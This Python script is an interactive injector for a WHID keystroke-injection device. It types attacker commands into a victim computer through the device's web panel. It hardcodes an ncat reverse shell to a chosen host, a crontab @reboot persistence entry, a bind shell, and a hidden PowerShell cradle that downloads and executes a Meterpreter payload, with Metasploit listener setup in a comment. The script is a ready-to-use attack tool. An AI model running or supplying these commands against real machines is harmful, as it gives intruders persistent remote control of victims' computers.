#!/usr/bin/python3
# -*- coding: utf-8 -*-
# NOTE: python3 WHIDInjector.py -v --host 192.168.10.22 --port 4242 #reverse
import requests
import argparse
import re
from WhidInfo import *
from WhidEngine import *
from pathlib import Path
from urllib.parse import urlencode, quote_plus

if __name__ == "__main__":

    # Parsing argument from command line
    parser = argparse.ArgumentParser()
    parser.add_argument('-v',      action='store_true', dest='verbose',help='Verbosity of the output')
    parser.add_argument('--force', action='store_true', dest='force',  help='Force the output in french')
    parser.add_argument('--host',      nargs='?', default='127.0.0.1',            help='Host reverse-shell' )
    parser.add_argument('--port',      nargs='?', default='4242',                 help='Port reverse-shell' )
    parser.add_argument('--user',      nargs='?', default='admin',                help='Panel username')
    parser.add_argument('--pass',      nargs='?', default='hacktheplanet',        help='Panel password')
    parser.add_argument('--panel',     nargs='?', default='http://192.168.1.1',   help='Panel url')
    parser.add_argument('--wifi_ssid', nargs='?', default='Exploit',              help='Wifi ssid')
    parser.add_argument('--wifi_pass', nargs='?', default='DotAgency',            help='Wifi password')
    parser.add_argument('--payload',   nargs='?', default='payloads/default.txt', help='Payload template')
    results = parser.parse_args()

    # Default payload
    payload = ""
    with open(results.payload,'r') as f:
        payload = f.read()

    info = WhidInfo()
    whid = WhidEngine(results.panel)
    while(True):
        user_input = input("\033[92m>>> \033[0m")


        # Handling : SET xxxxxx yyyyyy
        if user_input.split(" ")[0].upper() == "SET":
            options = user_input.split(" ")
            if options[1] == "host":
                results.host = options[2]
            elif options[1] == "port":
                results.port = options[2]
            elif options[1] == "user":
                results.user = options[2]
            elif options[1] == "verbose":
                results.verbose = options[2].lower() == "true"
            elif options[1] == "panel":
                results.panel = options[2]
            elif options[1] == "wifi_ssid":
                results.wifi_ssid = options[2]
            elif options[1] == "wifi_pass":
                results.wifi_pass = options[2]
            elif options[1] == "payload":
                results.payload = options[2]
                with open(results.payload,'r') as f:
                    payload = f.read()
            else:
                print("Unknown option - e.g: SET host 127.0.0.1")
            continue

        else:

            # Simple user interactions
            if user_input == "q" or user_input=="exit":
                exit()

            elif user_input == "h" or user_input == "help":
                info.help()
                info.help_keyboard()
                info.help_commands()
                continue

            # Reverse Shell Linux
            elif "reverse" == user_input :
                user_input = "bash -c 'nohup ncat %s %s -e $SHELL &'" % (results.host, results.port)

            # Crontab Linux
            elif "crontab" == user_input :
                user_input = "bash -c '(crontab -l ; echo \"@reboot sleep 200 && ncat %s %s -e /bin/bash\")|crontab 2> /dev/null'" % (results.host, results.port)

            # Bind Shell Linux
            elif "bind" == user_input:
                user_input = "bash -c 'nohup ncat -lvp %s -e $SHELL -k &'" % (results.port)

            # Meterpreter or anything for Windows
            elif "meterpreter" in user_input :
                """
                # Use the following to set up the listener
                use exploit/multi/script/web_delivery
                set SRVHOST YOUR_SERVER_IP
                set SRVPORT 4646
                set SSL true
                set target 2
                set URIPATH posh-payload
                set payload windows/meterpreter/reverse_https
                set ExitOnSession false
                set LHOST YOUR_SERVER_IP
                set LPORT 4545
                exploit -j -z

                # E.g: meterpreter https://YOUR_SERVER_IP:4646/posh-payload
                """
                if len(user_input.split(" ")) > 1:
                    msf_host = user_input.split(" ")[1]
                else:
                    msf_host = "https://%s:%s/posh-payload" % (results.host, results.port)

                user_input = "powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$i=new-object net.webclient;$i.proxy=[Net.WebRequest]::GetSystemWebProxy();$i.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $i.downloadstring('%s');" % msf_host

                # Send the payload
                user_converted = whid.convert_to_keymap(user_input, "CustomDelay:1000\nPrint:%s\nCustomDelay:1000\nPress:176", results.force)
                whid.send_payload(user_converted, results.panel+"/runlivepayload")
                continue


            # Send simple text without using a payload chain
            elif 'send' == user_input.split(' ')[0]:
                # Convert the simple text to keymap
                txt = "".join(user_input.split(' ')[1:])
                user_converted = whid.convert_to_keymap(txt, "CustomDelay:1000\nPrint:%s\nCustomDelay:1000\nPress:176", results.force)
                if results.verbose == True:
                    print('\033[92mText:\033[0m\n%s' % user_converted)

                # Send the payload
                whid.send_payload(user_converted, results.panel+"/runlivepayload")
                continue

            # Send evil command with default payload
            if user_input != "":

                # Convert from AZERTY to QWERTY
                user_converted = whid.convert_to_keymap(user_input, payload, results.force)
                if results.verbose == True:
                    print('\033[92mPayload:\033[0m\n%s' % user_converted)

                # Send the payload
                whid.send_payload(user_converted, results.panel+"/runlivepayload")
